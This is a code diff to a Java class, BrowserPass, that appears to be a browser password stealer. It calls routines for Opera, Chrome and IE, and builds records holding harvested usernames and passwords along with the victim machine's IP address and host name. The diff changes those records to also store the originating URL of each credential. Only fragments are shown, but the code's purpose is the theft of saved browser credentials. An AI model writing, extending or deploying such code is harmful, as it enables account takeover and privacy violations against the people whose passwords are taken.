@@ -22,8 +22,7 @@ public class BrowserPass {
 
     public static void main(String[] args) {
         BrowserPass pass = new BrowserPass();
-        
-        
+
         pass.opera();
         pass.chrome();
         pass.IE();
@@ -52,7 +51,7 @@ public class BrowserPass {
             rec.setBrowser("chrome");
             rec.setCreatedtime(new java.util.Date());
             rec.setIpaddress(socket.getInetAddress().getHostAddress());
-            rec.setOtherinfo("none for now");
+            rec.setOtherinfo(originurl);
             rec.setPassword(password);
             rec.setUser(username);
             rec.setPcname(socket.getInetAddress().getHostName());
@@ -90,7 +89,7 @@ public class BrowserPass {
             rec.setBrowser("chrome");
             rec.setCreatedtime(new java.util.Date());
             rec.setIpaddress(socket.getInetAddress().getHostAddress());
-            rec.setOtherinfo("none for now");
+            rec.setOtherinfo(originurl);
             rec.setPassword(password);
             rec.setUser(username);
             rec.setPcname(socket.getInetAddress().getHostName());
@@ -128,7 +127,7 @@ public class BrowserPass {
             rec.setBrowser("chrome");
             rec.setCreatedtime(new java.util.Date());
             rec.setIpaddress(socket.getInetAddress().getHostAddress());
-            rec.setOtherinfo("none for now");
+            rec.setOtherinfo(originurl);
             rec.setPassword(password);
             rec.setUser(username);
             rec.setPcname(socket.getInetAddress().getHostName());
@@ -166,7 +165,7 @@ public class BrowserPass {
             rec.setBrowser("chrome");
             rec.setCreatedtime(new java.util.Date());
             rec.setIpaddress(socket.getInetAddress().getHostAddress());
-            rec.setOtherinfo("none for now");
+            rec.setOtherinfo(originurl);
             rec.setPassword(password);
             rec.setUser(username);
             rec.setPcname(socket.getInetAddress().getHostName());
